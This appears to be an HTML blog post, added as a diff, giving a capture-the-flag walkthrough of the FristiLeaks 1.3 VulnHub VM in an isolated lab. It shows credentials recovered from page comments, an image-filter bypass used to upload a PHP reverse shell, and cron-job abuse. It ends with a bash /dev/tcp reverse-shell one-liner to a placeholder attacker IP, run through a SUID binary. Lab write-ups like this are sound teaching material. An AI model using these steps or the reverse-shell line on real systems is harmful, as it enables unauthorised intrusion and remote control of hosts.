@@ -1,0 +1,186 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="LogistyxCat, Blog of a security student.">
+
+        <link rel="alternate"  href="/feeds/all.atom.xml" type="application/atom+xml" title="LogistyxCat Full Atom Feed"/>
+
+        <title>Frisitleaks 1.3 // LogistyxCat // Blog of a security student.</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="./theme/css/pure.css">
+    <link rel="stylesheet" href="./theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="./author/riley.html" title="See posts by Riley">
+                </a>
+                <h2 class="article-info">Riley</h2>
+                <small class="about-author"></small>
+                <h5>Published</h5>
+                <p>Fri 30 November 2018</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>Frisitleaks 1.3</h1>
+                        <p class="post-meta">
+                            // under                                 <a class="post-category" href="./tag/ctf.html">ctf</a>
+                                <a class="post-category" href="./tag/vulnhub.html">vulnhub</a>
+                        </p>
+                </header>
+            </section>
+            <h2>Description</h2>
+<p>A small VM made for a Dutch informal hacker meetup called Fristileaks.
+Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..</p>
+<h2>Setup</h2>
+<p>The virtual machine requires DHCP, and you have to manually set the machine's MAC address to <code>08:00:27:A5:A6:76</code>.
+My setup runs on an isolated network <code>10.100.100.0/24</code>, and the attacking box is at <code>10.100.100.99/24</code>.
+You can find the box <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">here</a> to folow along or do yourself.</p>
+<h1>Reconnaissance</h1>
+<p>First we should verify that the box is online. After, we can determine what services are running on the target.</p>
+<h4>Netdiscover</h4>
+<p><img alt="netdiscover" src="/images/ctf/fristileaks/netdiscover.png" title="Netdiscover"></p>
+<h4>Nmap</h4>
+<div class="highlight"><pre><span></span># Nmap 7.70 scan initiated  as: nmap -T4 -sC -sV -oA nmap/fristileaks 10.100.100.133
+Nmap scan report for 10.100.100.133
+Host is up (0.00032s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done -- 1 IP address (1 host up) scanned in 24.75 seconds
+</pre></div>
+
+
+<p>From this, we can determine that the target is running an Apache webserver on port 80.
+Further scans did not reveal any other external services.</p>
+<p>Using a browser to navigate to the site reveals a colourful webpage, but nowhere obvious to go:</p>
+<p><img alt="Fristileaks homepage" src="/images/ctf/fristileaks/homepage.png" title="Fristileaks homepage"></p>
+<p>There is very little content on this page, however nmap found a <code>http-robots.txt</code> file that had some directories listed.
+Viewing any of them reveals a sneaky trick, and another dead end.</p>
+<p><img alt="Not the URL we are looking for" src="/images/ctf/fristileaks/droid.png" title="Not the URL we are looking for"></p>
+<p>Navigating to <code>/admin</code> only leads to a 404 Not Found message, so we will have to input other possible directory or URI names.
+Fortunately, we don't have to brute force this puzzle.
+By simply going to <code>/fristi</code>, one will be rewarded with the following:</p>
+<p><img alt="Fristileaks hidden admin page" src="/images/ctf/fristileaks/adminpage.png" title="Fristileaks hidden admin page"></p>
+<h1>Exploitatin &amp;&amp; Gaining Access</h1>
+<p>A hidden admin portal asking for credentials.
+Attempting to bypass the page using typical methods (such as SQLi or default creds) doesn't seem to work.
+We can take a look at the rendered HTML source.
+In there, we find a few interesting comments.</p>
+<p>One a TODO list by 'eezeepz',</p>
+<p><img alt="Comment from eezeepz" src="/images/ctf/fristileaks/admin-comment.png" title="Comment from eezeepz"></p>
+<p>and the other is Base64 encoded.</p>
+<p><img alt="Base64 encoded something" src="/images/ctf/fristileaks/admin-base64.png" title="Base64 encoded something"></p>
+<p>Decoding the B64 text reveals a .png image with the text <code>keKkeKKeKKeKkEkkEk</code>.
+While quite strange, using <code>eezeepz:keKkeKKeKKeKkEkkEk</code> for credentials does work, and redirects us to <code>/fristi/login_success.php</code>, with a link to <code>/fristi/upload.php</code>.
+Progress!</p>
+<p>There are some minor restrictions.
+The file uploaded must be a PNG, JPG, or GIF image.
+Fortunately this is a very simple filter, and easily bypassed.</p>
+<p>Simply: locate your PHP webshell of choice (such as <code>php-reverse-shell.php</code>, located in <code>/usr/share/webshells/php</code> in Kali); copy it to your working directory and modify as needed; rename the file with .png appended (<code>php-reverse-shell.php.png</code>); upload the shell, and navigate to <code>/fristi/uploads/&lt;your-file-name-here&gt;.php.png</code>.</p>
+<p><img alt="Uploading webshell" src="/images/ctf/fristileaks/upload.png" title="Uploading webshell"></p>
+<p>And just like magic, we now have a shell as the apache user!</p>
+<p><img alt="Webshell!" src="/images/ctf/fristileaks/webshell.png" title="Webshell!"></p>
+<h1>Post-Exploitation</h1>
+<p>The apache user has very limited privileges, so we should make it our goal to quickly gain access to another user account.</p>
+<p>There are three user accounts we could compromise:</p>
+<p><img alt="User accounts" src="/images/ctf/fristileaks/home.png" title="/home"></p>
+<p>Since we don't have read or execute access to any directory but eezeepz, we will have to start there.</p>
+<p>Navigating to eezeepz home, there is a slough of system binaries and a file <code>notes.txt</code>:</p>
+<p><img alt="Content of notes.txt" src="/images/ctf/fristileaks/notes.png" title="Content of notes.txt"></p>
+<p>The instructions are pretty straightforward.
+By listing binaries using full paths in <code>/usr/bin</code>, <code>/home/admin</code>, and presumably <code>/home/eezeepz</code> in a file called <code>/tmp/runthis</code>, a cronjob will execute the binaries every minute as <code>admin</code>.</p>
+<p>My solution to this was to execute <code>echo "/home/admin/chmod 707 /home/admin" &gt;&gt; /tmp/runthis</code>, which will allow us to Read, Write, and Execute privileges in <code>/home/admin</code> as any user.</p>
+<p><img alt="Modifying /home/admin privileges" src="/images/ctf/fristileaks/chmod.png" title="Modifying /home/admin privileges"></p>
+<h1>Privilege Escalation</h1>
+<p>Taking a look into the newly accessible directory reveals the previously revealed system binaries, some python scripts, and two text files <code>cryptedpass.txt</code> (owned by admin) and <code>whoisyourgodnow.txt</code> (owned by fristigod).</p>
+<p>The contents of the text files appear to be the output of the <code>cryptpass.py</code> script.</p>
+<p><img alt="cryptedpass.txt/cryptpass.py" src="/images/ctf/fristileaks/cryptpass.png" title="The contents of cryptedpass.txt and cryptpass.py"></p>
+<p>The python script takes a string argument, encodes it in Base64, and then reverses the string and modifies it with ROT13.
+This isn't encryption, it's encoding, and passwords should never be encrypted or encoded.</p>
+<p>It's very easy to reverse this process, especially using <a href="https://github.com/gchq/CyberChef">CyberChef</a>.</p>
+<p><img alt="Reversing cryptedpass.txt" src="/images/ctf/fristileaks/rev-cryptedpass.png" title="Reversing cryptedpass.txt">
+<img alt="Reversing whoisyourgodnow.txt" src="/images/ctf/fristileaks/rev-whoisyourgodnow.png" title="Reversing whoisyourgodnow.txt"></p>
+<p>At this point I uploaded the php-reverse-shell.php and caught it with Ncat, as the webshell I was isn't a terminal.</p>
+<p><img alt="su admin" src="/images/ctf/fristileaks/su-admin.png" title="su admin">
+<img alt="su fristigod" src="/images/ctf/fristileaks/su-fristigod.png" title="su fristigod"></p>
+<h1>Getting Root</h1>
+<p>Despite being called admin, I determined that the account did not have sufficient rights to use sudo.
+Fristigod, on the other hand, has access to a single binary.</p>
+<p><img alt="One true binary" src="/images/ctf/fristileaks/fristigod-sudo-l.png" title="One true binary"></p>
+<p>Fristigod may run sudo as user 'fristi' to execute <code>/var/fristigod/.secret_admin_stuff/doCom</code>.
+What is <code>doCom</code>?
+In our case, it's a SUID binary owned by root.</p>
+<p><img alt="doCom" src="/images/ctf/fristileaks/doCom.png" title="doCom"></p>
+<p>Let's verify that it runs as root.</p>
+<p><img alt="Testing execution" src="/images/ctf/fristileaks/exec-test.png" title="Testing execution"></p>
+<p>Excellent!
+This means that we can execute a simple reverse shell and gain access to root. I like <code>bash -i &gt;&amp; /dev/tcp/&lt;ATTAKCER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code> from <a href="http://pentestmonkey.net/">pentestmonkey</a>, though it is insecure.</p>
+<p><img alt="Getting root" src="/images/ctf/fristileaks/get-root.png" title="Getting root"></p>
+<p><img alt="Got root" src="/images/ctf/fristileaks/got-root.png" title="Got root"></p>
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<footer class="footer">
+    <p>&copy; LogistyxCat &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+</body>
+</html>
